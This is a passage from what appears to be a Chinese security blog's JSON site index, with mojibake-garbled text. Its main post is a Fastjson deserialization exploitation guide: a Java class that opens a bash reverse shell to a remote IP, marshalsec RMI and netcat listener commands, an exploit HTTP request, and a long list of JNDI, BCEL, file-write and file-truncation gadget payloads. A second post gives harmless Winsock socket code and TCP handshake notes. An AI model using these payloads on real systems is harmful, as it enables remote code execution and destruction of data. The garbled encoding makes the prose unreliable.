12345&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sdffsd.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxxxx.dnslog.cn&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;wefewffw.dnslog.cn&quot;&#125;&#125; æŠ¥é”™åˆ¤æ–­ æäº¤ä¸€ä¸‹ä¸¤ä¸ªPOCï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæœ‰æ—¶å€™ä¼šæ˜¾ç¤ºå‡ºfastjsonç‰ˆæœ¬å·æ¥ã€‚ 12345&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;[&quot;test&quot;:1] è¾“å…¥ä¸€äº›ä¹±ç å­—ç¬¦ï¼Œè®©webåº”ç”¨æŠ¥é”™ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šå¸¦å‡ºæ¥ç‰ˆæœ¬å· vulhubæ¼æ´å¤ç°fastjson1.2.24 dockerå¯åŠ¨ç¯å¢ƒ kaliåˆ›å»ºTouchFileæ–‡ä»¶ç”¨æ¥åå¼¹shellã€‚ 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;static &#123; try &#123; Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.5.143/4444 0&gt;&amp;1&quot;&#125;); p.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; pythonèµ·ä¸€ä¸ªhttpæœåŠ¡ 1python2 -m SimpleHTTPServer marshalsecå¯åŠ¨RMIæœåŠ¡å™¨ 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.110.141:4433/#TouchFile&quot; 9988 kaliä¸Šç”¨NCå¼€å¯ç«¯å£ç›‘å¬ 1nc -lvvp 4444 æŠ“åŒ…æ”¹ä¸ºPOSTåŒ… 1234567891011121314151617POST / HTTP/1.1Host: 192.168.110.141:8090User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: enConnection: closeContent-Type: application/jsonContent-Length: 165&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.168.110.141:9988/TouchFile&quot;, &quot;autoCommit&quot;:true &#125;&#125; å¼¹åˆ°shell fastjson1.2.27payloadæ€»ç»“JdbcRowSetImpl 12345&#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;autoCommit&quot;: true&#125; TemplatesImpl 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgA...k=&quot;], &#x27;_name&#x27;: &#x27;su18&#x27;, &#x27;_tfactory&#x27;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; JndiDataSourceFactory 123456&#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; SimpleJndiBeanFactory 1234567891011&#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;propertyPath&quot;: &quot;su18&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;&#125; DefaultBeanFactoryPointcutAdvisor 12345678910111213&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;,&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;&#125; WrapperConnectionPoolDataSource 1234&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot; &#125; JndiRefForwardingDataSource 12345&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;loginTimeout&quot;: 0 &#125; InetAddress 1234&#123; &quot;@type&quot;: &quot;java.net.InetAddress&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; Inet6Address 1234&#123; &quot;@type&quot;: &quot;java.net.Inet6Address&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; URL 1234&#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; JSONObject 123456789&#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot; &#125;&#125;&quot;&quot;&#125; URLReader 12345678910&#123; &quot;poc&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;, &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;http://127.0.0.1:9999&quot; &#125; &#125;&#125; AutoCloseable ä»»æ„æ–‡ä»¶å†™å…¥ 123456789101112&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/path/to/target&quot; &#125;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;, &quot;filename&quot;: &quot;filecontent&quot; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;, &quot;driverClassLoader&quot; : &#123; &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot; &#125;&#125; JndiConverter 1234&#123; &quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JtaTransactionConfig 1234567&#123; &quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, &quot;properties&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; JndiObjectFactory 1234&#123; &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig2 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; CacheJndiTmLookup 1234&#123; &quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AutoCloseable æ¸…ç©ºæŒ‡å®šæ–‡ä»¶ 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable æ¸…ç©ºæŒ‡å®šæ–‡ä»¶ 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileWriter&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable ä»»æ„æ–‡ä»¶å†™å…¥ 1234567891011121314151617181920212223242526272829&#123; &quot;stream&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;, &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;, &quot;sink&quot;: &#123; &quot;$ref&quot;:&quot;$.stream&quot; &#125;, &quot;start&quot;:38 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;:&quot;$.writer&quot; &#125; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;, &quot;driverClassName&quot;: &quot;true&quot;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot; &#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; SessionBeanProvider 12345&#123; &quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;Object&quot;: &quot;su18&quot;&#125; JMSContentInterceptor 123456789&#123; &quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;java.util.Hashtable&quot;, &quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;, &quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;, &quot;namespace&quot;: &quot;&quot;&#125; ContextClassLoaderSwitcher 123456789&#123; &quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;, &quot;contextClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;a&quot;: &#123; &quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot; &#125;&#125; OracleManagedConnectionFactory 1234&#123; &quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;, &quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JNDIConfiguration 1234&#123; &quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"windowsä¸‹socketé€šä¿¡","slug":"windowsä¸‹socketé€šä¿¡","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-08T12:29:32.506Z","comments":true,"path":"2022/07/31/windowsä¸‹socketé€šä¿¡/","link":"","permalink":"http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142server.c#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt;#pragma comment (lib, &quot;ws2_32.lib&quot;) //åŠ è½½ ws2_32.dll int main()&#123; //åˆå§‹åŒ– DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //åˆ›å»ºå¥—æ¥å­— SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //ç»‘å®šå¥—æ¥å­— struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //æ¯ä¸ªå­—èŠ‚éƒ½ç”¨0å¡«å…… sockAddr.sin_family = PF_INET; //ä½¿ç”¨IPv4åœ°å€ sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //å…·ä½“çš„IPåœ°å€ sockAddr.sin_port = htons(1234); //ç«¯å£ bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //è¿›å…¥ç›‘å¬çŠ¶æ€ listen(servSock, 20); //æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ SOCKADDR clntAddr; int nSize = sizeof(SOCKADDR); SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize); //å‘å®¢æˆ·ç«¯å‘é€æ•°æ® char *str = &quot;Hello World!&quot;; send(clntSock, str, strlen(str) + sizeof(char), 0); //å…³é—­å¥—æ¥å­— closesocket(clntSock); closesocket(servSock); //ç»ˆæ­¢ DLL çš„ä½¿ç”¨ WSACleanup(); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738client.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //åŠ è½½ ws2_32.dll int main()&#123; //åˆå§‹åŒ–DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //åˆ›å»ºå¥—æ¥å­— SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //æ¯ä¸ªå­—èŠ‚éƒ½ç”¨0å¡«å…… sockAddr.sin_family = PF_INET; sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); connect(sock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //æ¥æ”¶æœåŠ¡å™¨ä¼ å›çš„æ•°æ® char szBuffer[MAXBYTE] = &#123; 0 &#125;; recv(sock, szBuffer, MAXBYTE, NULL); //è¾“å‡ºæ¥æ”¶åˆ°çš„æ•°æ® printf(&quot;Message form server: %s\\n&quot;, szBuffer); //å…³é—­å¥—æ¥å­— closesocket(sock); //ç»ˆæ­¢ä½¿ç”¨ DLL WSACleanup(); system(&quot;pause&quot;); return 0;&#125; åˆ†åˆ«ç¼–è¯‘server.c&amp;client.cï¼Œå…ˆè¿è¡Œserver.exeåˆ›å»ºserverç«¯ï¼Œåè¿è¡Œclient.exeï¼Œå¯å¾—ç»“æœå¦‚ä¸‹ wiresharkæŠ“åŒ…åˆ†æ æ ¹æ®SYN,ACKæ ‡è¯†å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹TCPè¿æ¥ æ ¹æ®PSH,ACKæ ‡è¯†ä»¥åŠLen&#x3D;13å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œä¼ è¾“äº†13ä¸ªå­—ç¬¦ æ ¹æ®FIN,ACKæ ‡è¯†å¯ä»¥çœ‹åˆ°serveå’Œclientç«¯å››æ¬¡æŒ¥æ‰‹ï¼Œæ–­å¼€TCPè¿æ¥ è¿™é‡Œå†ç®€å•å¤ä¹ ä¸€ä¸‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹ 1234567891011121314151617181920ä¸‰æ¬¡æ¡æ‰‹ï¼šåˆšå¼€å§‹å®¢æˆ·ç«¯å¤„äº closed çš„çŠ¶æ€ï¼ŒæœåŠ¡ç«¯å¤„äº listen çŠ¶æ€ã€‚ç„¶å1ã€ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯ç»™æœåŠ¡ç«¯å‘ä¸€ä¸ª SYN æŠ¥æ–‡ï¼Œå¹¶æŒ‡æ˜å®¢æˆ·ç«¯çš„åˆå§‹åŒ–åºåˆ—å· ISNï¼ˆcï¼‰ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äº SYN_Send çŠ¶æ€ã€‚2ã€ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šä»¥è‡ªå·±çš„ SYN æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æŒ‡å®šäº†è‡ªå·±çš„åˆå§‹åŒ–åºåˆ—å· ISN(s)ï¼ŒåŒæ—¶ä¼šæŠŠå®¢æˆ·ç«¯çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºè‡ªå·±å·²ç»æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„ SYNï¼Œæ­¤æ—¶æœåŠ¡å™¨å¤„äº SYN_REVD çš„çŠ¶æ€ã€‚3ã€ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šå‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ï¼Œå½“ç„¶ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠŠæœåŠ¡å™¨çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºå·²ç»æ”¶åˆ°äº†æœåŠ¡ç«¯çš„ SYN æŠ¥æ–‡ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº establised çŠ¶æ€ã€‚4ã€æœåŠ¡å™¨æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œä¹Ÿå¤„äº establised çŠ¶æ€ï¼Œæ­¤æ—¶ï¼ŒåŒæ–¹ä»¥å»ºç«‹èµ·äº†é“¾æ¥ã€‚å››æ¬¡æŒ¥æ‰‹ï¼š1ã€ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ª FIN æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºFIN_WAIT1çŠ¶æ€ã€‚2ã€ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¼šå‘é€ ACK æŠ¥æ–‡ï¼Œä¸”æŠŠå®¢æˆ·ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸º ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œè¡¨æ˜å·²ç»æ”¶åˆ°å®¢æˆ·ç«¯çš„æŠ¥æ–‡äº†ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å¤„äº CLOSE_WAITçŠ¶æ€ã€‚3ã€ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šå¦‚æœæœåŠ¡ç«¯ä¹Ÿæƒ³æ–­å¼€è¿æ¥äº†ï¼Œå’Œå®¢æˆ·ç«¯çš„ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ä¸€æ ·ï¼Œå‘ç»™ FIN æŠ¥æ–‡ï¼Œä¸”æŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶æœåŠ¡ç«¯å¤„äº LAST_ACK çš„çŠ¶æ€ã€‚4ã€ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¸€æ ·å‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œä¸”æŠŠæœåŠ¡ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸ºè‡ªå·± ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº TIME_WAIT çŠ¶æ€ã€‚éœ€è¦è¿‡ä¸€é˜µå­ä»¥ç¡®ä¿æœåŠ¡ç«¯æ”¶åˆ°è‡ªå·±çš„ ACK æŠ¥æ–‡ä¹‹åæ‰ä¼šè¿›å…¥ CLOSED çŠ¶æ€5ã€æœåŠ¡ç«¯æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œå°±å¤„äºå…³é—­è¿æ¥äº†ï¼Œå¤„äº CLOSED çŠ¶æ€ã€‚","categories":[{"name":"windowsé€†å‘","slug":"windowsé€†å‘","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"ç¼–ç¨‹","slug":"windowsé€†å‘/ç¼–ç¨‹","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windowsç¼–ç¨‹","slug":"windowsç¼–ç¨‹","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/"},{"name":"windowsé€†å‘ï¼Œå†…æ ¸å®‰å…¨","slug":"windowsé€†å‘ï¼Œå†…æ ¸å®‰å…¨","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91%EF%BC%8C%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"},{"name":"çº¢è“æ”»é˜²","slug":"çº¢è“æ”»é˜²","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"},{"name":"webå®‰å…¨","slug":"çº¢è“æ”»é˜²/webå®‰å…¨","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/web%E5%AE%89%E5%85%A8/"},{"name":"é»‘ç§‘æŠ€","slug":"é»‘ç§‘æŠ€","permalink":"http://example.com/categories/%E9%BB%91%E7%A7%91%E6%8A%80/"},{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"},{"name":"æ¶æ„ä»£ç ","slug":"æ¶æ„ä»£ç ","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"windowsé€†å‘","slug":"windowsé€†å‘","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"ç¼–ç¨‹","slug":"windowsé€†å‘/ç¼–ç¨‹","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"windows,windowså®‰å…¨,åè°ƒè¯•","slug":"windows-windowså®‰å…¨-åè°ƒè¯•","permalink":"http://example.com/tags/windows-windows%E5%AE%89%E5%85%A8-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"æ”»é˜²","slug":"æ”»é˜²","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"é»‘ç§‘æŠ€","slug":"é»‘ç§‘æŠ€","permalink":"http://example.com/tags/%E9%BB%91%E7%A7%91%E6%8A%80/"},{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"æ¶æ„ä»£ç ","slug":"æ¶æ„ä»£ç ","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"javaæ¡†æ¶","slug":"javaæ¡†æ¶","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windowsç¼–ç¨‹","slug":"windowsç¼–ç¨‹","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}